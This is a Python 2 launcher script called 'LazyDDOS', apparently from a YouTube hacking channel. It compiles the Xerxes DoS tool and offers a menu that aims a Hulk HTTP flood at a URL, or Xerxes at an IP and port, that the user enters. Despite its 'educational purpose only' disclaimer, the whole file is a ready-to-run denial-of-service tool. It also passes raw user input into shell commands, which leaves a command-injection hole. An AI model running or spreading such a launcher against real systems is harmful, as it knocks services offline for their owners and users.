import os
import sys
import random

########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
#Coded by TheTechHacker                #
######################################################################
#SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ #
######################################################################

os.system("clear")

def update():
    os.system("clear")
    os.system("sudo apt-get install gcc")
    os.system("sudo apt-get install figlet")
    os.system("gcc xerxes.c -o xerxes")

def DDOS():
    os.system("clear")
    print " "
    print "\033[1;32m-----------------------------------------------\033[1;m"
    print "\033[1;32m              Hulk DDOS tool                   \033[1;m"
    print "\033[1;32m   Example: http://www.fakesite.com            \033[1;m"
    print "\033[1;32m-----------------------------------------------\033[1;m"
    print " "
    url = raw_input(" url> ")
    os.system('python main.py' ' ' + url)

def ip_dos():
    os.system("clear")
    print " "
    print "\033[1;32m--------------------------\033[1;m"
    print "\033[1;32m      Xerxes DoS tool     \033[1;m"
    print "\033[1;32m--------------------------\033[1;m"
    print " "
    ip = raw_input("ip> ")
    port = raw_input("port> ")
    space = ' '
    os.system(("./xerxes " + ip + space) + port)

print "\033[1;32m-------------------------------------------------------------------------\033[1;m"
os.system("figlet LazyDDOS")
print "\033[1;32m-------------------------------------------------------------------------\033[1;m"
print "\033[1;32m                 Created by: TheTechHacker                               \033[1;m"
print "\033[1;32m-------------------------------------------------------------------------\033[1;m"
print "\033[1;32m   SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ   \033[1;m"
print "\033[1;32m-------------------------------------------------------------------------\033[1;m"

print "  "
print "  "

print " 1) Install"
print " 2) DDOS"
print " 3) exit"

print "   "
print "   "

user = input("Enter> ")

if user is 3:
    exit("SUBSCRIBE TO MY YOUTUBE CHANNEL")

if user is 1:
    print (update())
    exit()

if user is 2:
    os.system("clear")
    print "\033[1;32m-------------------------\033[1;m"
    os.system("figlet Lazy")
    print "\033[1;32m-------------------------\033[1;m"
    print " "
    print " 1)ip-dos"
    print " 2)http"
    print "  "
    enter = input("Enter> ")

if enter is 1:
    os.system('clear')
    print (ip_dos())

if enter is 2:
    os.system("clear")
    print (DDOS())
